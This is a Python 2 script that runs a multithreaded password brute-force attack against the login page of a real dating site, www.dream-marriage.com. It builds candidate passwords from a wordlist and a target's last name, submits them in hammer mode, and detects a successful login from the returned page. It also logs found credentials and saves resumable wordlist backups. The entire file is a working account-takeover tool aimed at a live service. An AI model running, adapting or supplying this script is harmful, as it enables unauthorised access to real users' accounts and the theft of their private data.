#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
try:
	import re, threading, time, logging, random
	from grab import Grab
	from datetime import datetime
	from copy import copy
	from time import time
	from time import ctime
	from time import sleep
except(ImportError):
	print "\nTo use this script you need (grab, python-lxml, python-lxml-dbg ) modules."\
			"\nRead the top intro for instructions.\n"
	a = raw_input('Do you want install it [Y/n]? ')
	if a == 'y' or a == 'Y':
		os.system('sudo aptitude install python-pip python-lxml python-lxml-dbg && sudo pip install grab')
		sys.exit(1)
	else:
		sys.exit(1)
if len(sys.argv) !=6:
	print "Usage: brute.py <user> <last name> <wordlist> <threads> <logging>"
	sys.exit(1)
if sys.argv[5] == 'y' or sys.argv[5] == 'true':
    logger = logging.getLogger('grab')
    logger.addHandler(logging.StreamHandler())
    logger.setLevel(logging.DEBUG)
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

def threadload(count):
	global Itslive
	global success
	
	if Itslive and not success:
		print '\033[32m[+] Running ',count,' threads \n\033[0m'
		
		try:
			for i in range(count):
				sleep(1)
				work = Worker()
				work.start()
		except Exception:
			print '\033[31m[!] Thread load error\n\033[0m'
			Itslive = False
			saweresult('.bak')
			sys.exit(1)

def getword():
	global Itslive
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.choice(words)
		words.remove(value)
		value = value.rstrip()
	else:
		Itslive = False
		sys.exit(1)
	lock.release()
	return value

def getmissed(nextword):
	lock = threading.Lock()
	lock.acquire()
	missed.append(nextword)
	lock.release()
	
def saweresult(extension = '.txt'):
	print '\033[32m\n[+] Sawing wordlist ...\n\033[0m'
	sawed_time = ctime(time())
	if success:
		file = open(sys.argv[1] + '_success_' + str(sawed_time) + extension, 'w')
		file.write(str(sys.argv[1]) + '\t' + success)
		file.close()
	if (len(words)):
		file = open(sys.argv[1] + '_backup_' + str(sawed_time) + extension, 'w')
		file.writelines(["%s" % item  for item in words])
		file.close()
	if (len(missed)):
		file = open(sys.argv[1] + '_missed_' + str(sawed_time) + extension, 'w')
		file.writelines(["%s\n" % item  for item in missed])
		file.close()
	print sawed_time

def reloadthreads():
	global Itslive
	current_threads = threading.active_count()
	required_hreads = int(sys.argv[4]) + 1
	recover_threads = required_hreads - current_threads
	
	if threading.active_count() == 1:
		Itslive = False
		#sys.exit(1)
		
	if recover_threads:	
		threadload(recover_threads)

def checker():
	global Itslive
	global buff
	print '\033[32m\n[!] Checker running ...\n\033[0m'
	begin_time = time()
	while Itslive:
		sleep(1)
		current_time = (time() - begin_time) / 60
		words_parsed = words_loaded - len(words) - len(missed) +1
		words_per_m = float(words_parsed) / float(current_time)
		end_time = time() + ((len(words) / words_per_m) * 60)
		percent =  100 * (float(words_parsed)/float(words_loaded))
		percent_missed =  100 * (float(len(missed))/float(words_parsed))
		os.system('clear')
		print '\033[32m[!] WORDS ',words_parsed,'(',round(percent,2),'%)',' MISSED ',len(missed),'(',round(percent_missed,2),'%)',' WPM ',int(words_per_m),'\033[0m'
		print '\033[32m[!] RUN ',ctime(begin_time),'\tEND ',ctime(end_time),'\033[0m'
		
		print '-'*70
		print "\t Server: www.dream-marriage.com"
		print "\t Len Words: ",len(words),"\n"
		print '\033[32m\t user :\033[0m\033[31m pass \033[0m', '\033[32m\t', sys.argv[1], '\033[0m', ': \033[31m', buff, '\033[0m'
		print '\033[32m\t\t *** Threads alive: ',threading.active_count(),' ***\t\n\033[0m'
		
		if Itslive != False and success == False:
			reloadthreads()
		
class Worker(threading.Thread):
	def bot(self, value, nextword, g):
		global success
		global Itslive
		global buff
		buff = value
		if sys.argv[5] == 'y' or sys.argv[5] == 'true':
			#print "-"*12
			print '\033[32m\n\t user :\033[0m\033[31m pass \033[0m', '\033[32m\t', sys.argv[1], '\033[0m', ': \033[31m', value, '\033[0m'
		g.set_input('login', sys.argv[1])
		g.set_input('password', str(value))
		g.setup(hammer_mode=True, hammer_timeouts=((20, 30), (60, 90), (150, 200)))
		g.submit()
		#sleep(0.5)
		if g.search(u'Correspondences'):
			print '\033[32m\n\t[!] Successful Login:\033[0m', "\033[31m", value,"\033[0m"
			success =  value
			Itslive = False
			sys.exit(1)
		if not g.search(u'Forgot your password?'):
			print '\033[31m[!]\tNOT OK\033[0m'
			getmissed(nextword)
	
	def run (self):
		global Itslive
		global success
		try:
			g = Grab()
			g.setup(hammer_mode=True, hammer_timeouts=((20, 30), (60, 90), (150, 200)))
			g.go(uri)
		except Exception:
			print "\n[!] No valid proxy or network error ...\n"
			Itslive = False
			sys.exit(1)		
		while Itslive and not success:
			nextword = getword()
			value = last + nextword
			try:
				self.bot(value, nextword, g)
			except Exception:
				#print "\n[!] Network error ...\n"
				#Itslive = False
				sys.exit(1)

if __name__ == '__main__':
		
	uri = 'https://www.dream-marriage.com/russian-dating-login.php'
	words_loaded = len(words)
	last = sys.argv[2]
	last = last[2:]
	success =  False
	Itslive = True
	missed = []
	buff = 'null'

	print "\t--------------------------------------------------\n"
	print "[+] Server: www.dream-marriage.com"
	print "[+] User:",sys.argv[1]
	print "[+] Words Loaded:",words_loaded,"\n"
	
	threadload(int(sys.argv[4]))
	print "\n[+] All threads loaded ...\n\a"
	checker()
	saweresult()
	#sleep(5)
	
	if success:
		print '\033[32m\n\n[+] Successful Login: www.dream-marriage.com\033[0m'
		print "\033[31m\n[+] User:",sys.argv[1]," Password:",success,"\033[0m"
	else:
		print "\033[31m\n[!] Couldn't find correct password!\033[0m"
	print "\n[+] Done ...\n\a"
